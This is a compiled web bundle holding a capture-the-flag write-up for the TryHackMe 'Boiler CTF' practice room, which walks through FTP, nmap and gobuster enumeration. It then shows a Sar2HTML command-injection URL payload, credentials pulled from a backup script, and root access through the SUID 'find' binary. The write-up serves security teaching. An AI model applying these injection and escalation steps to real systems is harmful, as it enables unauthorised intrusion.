"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3834],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>k});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var i=r.createContext({}),p=function(e){var t=r.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(i.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,i=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),c=p(n),m=o,k=c["".concat(i,".").concat(m)]||c[m]||d[m]||a;return n?r.createElement(k,l(l({ref:t},u),{},{components:n})):r.createElement(k,l({ref:t},u))}));function k(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,l=new Array(a);l[0]=m;var s={};for(var i in t)hasOwnProperty.call(t,i)&&(s[i]=t[i]);s.originalType=e,s[c]="string"==typeof e?e:o,l[1]=s;for(var p=2;p<a;p++)l[p]=n[p];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},71938:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>l,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>p});var r=n(87462),o=(n(67294),n(3905));const a={},l="Boiler CTF",s={unversionedId:"Tryhackme/Boiler CTF/Boiler CTF",id:"Tryhackme/Boiler CTF/Boiler CTF",title:"Boiler CTF",description:"Intermediate level CTF",source:"@site/writeups/Tryhackme/Boiler CTF/Boiler CTF.md",sourceDirName:"Tryhackme/Boiler CTF",slug:"/Tryhackme/Boiler CTF/",permalink:"/writeups/Tryhackme/Boiler CTF/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Blueprint",permalink:"/writeups/Tryhackme/Blueprint/"},next:{title:"Bolt",permalink:"/writeups/Tryhackme/Bolt/"}},i={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Questions #1",id:"task-1-questions-1",level:2},{value:"Task 2 Questions #2",id:"task-2-questions-2",level:2}],u={toc:p},c="wrapper";function d(e){let{components:t,...n}=e;return(0,o.kt)(c,(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"boiler-ctf"},"Boiler CTF"),(0,o.kt)("p",null,"Intermediate level CTF"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/boilerctf2"},"Boiler CTF")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Exploitation Joomle Sar2HTML 3.2.1"),(0,o.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,o.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-questions-1"},"Task 1 Questions #1"),(0,o.kt)("p",null,"Intermediate level CTF. Just enumerate, you'll get there."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"File extension after anon login")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Boiler CTF$ ftp 10.10.57.168\nConnected to 10.10.57.168.\n220 (vsFTPd 3.0.3)\nName (10.10.57.168:kali): anonymous\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .\ndrwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..\n-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt\n226 Directory send OK.\nftp> get .info.txt\nlocal: .info.txt remote: .info.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for .info.txt (74 bytes).\n226 Transfer complete.\n74 bytes received in 0.00 secs (87.1720 kB/s)\nftp> pwd\n257 \"/\" is the current directory\nftp> cd /home\n550 Failed to change directory.\nftp> cd ..\n250 Directory successfully changed.\nftp> pwd\n257 \"/\" is the current directory\nftp> exit\n221 Goodbye.\nkali@kali:~/CTFs/tryhackme/Boiler CTF$ cat .info.txt\nWhfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!\nkali@kali:~/CTFs/tryhackme/Boiler CTF$ cat .info.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'\nJust wanted to see if you find it. Lol. Remember: Enumeration is the key!\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"txt")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What is on the highest port?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Boiler CTF$ sudo nmap -sS -sC -sV -O -p- 10.10.57.168Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 14:07 CEST\nNmap scan report for 10.10.57.168\nHost is up (0.056s latency).\nNot shown: 65531 closed ports\nPORT      STATE SERVICE VERSION\n21/tcp    open  ftp     vsftpd 3.0.3\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n10000/tcp open  http    MiniServ 1.930 (Webmin httpd)\n|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).\n|_http-trane-info: Problem with XML parsing of /evox/about\n55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)\n|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)\n|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/7%OT=21%CT=1%CU=42115%PV=Y%DS=2%DC=I%G=Y%TM=5F7DAFE\nOS:A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SEQ\nOS:(SP=105%GCD=1%ISR=107%TI=Z%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M50\nOS:8NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%\nOS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC\nOS:=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=\nOS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A\nOS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4\nOS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=\nOS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 89.41 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SSH")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What's running on port 10000?")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://10.10.57.168:10000/"},"https://10.10.57.168:10000/"))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Webmin")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Can you exploit the service running on that port? (yay/nay answer)")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"nay")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What's CMS can you access?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Boiler CTF$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.57.168/\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.57.168/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/07 13:36:23 Starting gobuster\n===============================================================\n/manual (Status: 301)\n/joomla (Status: 301)\n/server-status (Status: 403)\nProgress: 105022 / 220561 (47.62%)^C\n[!] Keyboard interrupt detected, terminating.\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"joomla")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Keep enumerating, you'll know when you find it.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"The interesting file name in the folder?")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://10.10.57.168/joomla/_files/"},"http://10.10.57.168/joomla/","_","files/"))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"VjJodmNITnBaU0JrWVdsemVRbz0K")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Boiler CTF$ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d | base64 -d\nWhopsie daisy\n')),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://10.10.57.168/joomla/_test/"},"http://10.10.57.168/joomla/","_","test/"))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"sar2html ")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://www.exploit-db.com/exploits/47204"},"Sar2HTML 3.2.1 - Remote Command Execution"))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"http://<ipaddr>/index.php?plot=;<command-here>")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://10.10.57.168/joomla/_test/index.php?plot=;ls%20-la"},"http://10.10.57.168/joomla/","_","test/index.php?plot=;ls%20-la"))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"superduperp@$$")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"log.txt")),(0,o.kt)("h2",{id:"task-2-questions-2"},"Task 2 Questions #2"),(0,o.kt)("p",null,"You can complete this with manual enumeration, but do it as you wish"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Boiler CTF$ ssh basterd@10.10.57.168 -p 55007\nbasterd@10.10.57.168's password:\nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n8 packages can be updated.\n8 updates are security updates.\n\n\nLast login: Thu Aug 22 12:29:45 2019 from 192.168.1.199\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Where was the other users pass stored(no extension, just the name)?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ ls -la\ntotal 16\ndrwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .\ndrwxr-xr-x 4 root    root    4096 Aug 22  2019 ..\n-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh\n-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history\ndrwx------ 2 basterd basterd 4096 Aug 22  2019 .cache\n$ /bin/bash\nbasterd@Vulnerable:~$ cat backup.sh\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sh"},'REMOTE=1.2.3.4\n\nSOURCE=/home/stoner\nTARGET=/usr/local/backup\n\nLOG=/home/stoner/bck.log\n\nDATE=`date +%y\\.%m\\.%d\\.`\n\nUSER=stoner\n#superduperp@$$no1knows\n\nssh $USER@$REMOTE mkdir $TARGET/$DATE\n\n\nif [ -d "$SOURCE" ]; then\n    for i in `ls $SOURCE | grep \'data\'`;do\n             echo "Begining copy of" $i  >> $LOG\n             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE\n             echo $i "completed" >> $LOG\n\n                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then\n                    rm $SOURCE/$i\n                    echo $i "removed" >> $LOG\n                    echo "####################" >> $LOG\n                                else\n                                        echo "Copy not complete" >> $LOG\n                                        exit 0\n                fi\n    done\n\n\nelse\n\n    echo "Directory is not present" >> $LOG\n    exit 0\nfi\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"backup")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"user.txt")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"basterd@Vulnerable:~$ su stoner\nPassword:\nstoner@Vulnerable:/home/basterd$ cd ~\nstoner@Vulnerable:~$ ls -la\ntotal 16\ndrwxr-x--- 3 stoner stoner 4096 Aug 22  2019 .\ndrwxr-xr-x 4 root   root   4096 Aug 22  2019 ..\ndrwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano\n-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret\nstoner@Vulnerable:~$ cat .secret\nYou made it till here, well done.\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"You made it till here, well done.")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What did you exploit to get the privileged user?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"stoner@Vulnerable:~$ find / -perm /4000 -type f -exec ls -ld {} \\; 2>/dev/null\n-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su\n-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount\n-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount\n-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount\n-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6\n-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping\n-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1\n-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom\n-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine\n-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign\n-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device\n-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap\n-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find\n-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at\n-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh\n-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn\n-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd\n-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp\n-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo\n-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec\n-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"-r-sr-xr-x 1 root root 232196 Feb 8 2016 /usr/bin/find")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"root.txt")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"stoner@Vulnerable:~$ find . -exec chmod -R 777 /root \\;\nstoner@Vulnerable:~$ ls -l /root\ntotal 4\n-rwxrwxrwx 1 root root 29 Aug 21  2019 root.txt\nstoner@Vulnerable:~$ cat /root/root.txt\nIt wasn't that hard, was it?\nstoner@Vulnerable:~$\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"It wasn't that hard, was it?")))}d.isMDXComponent=!0}}]);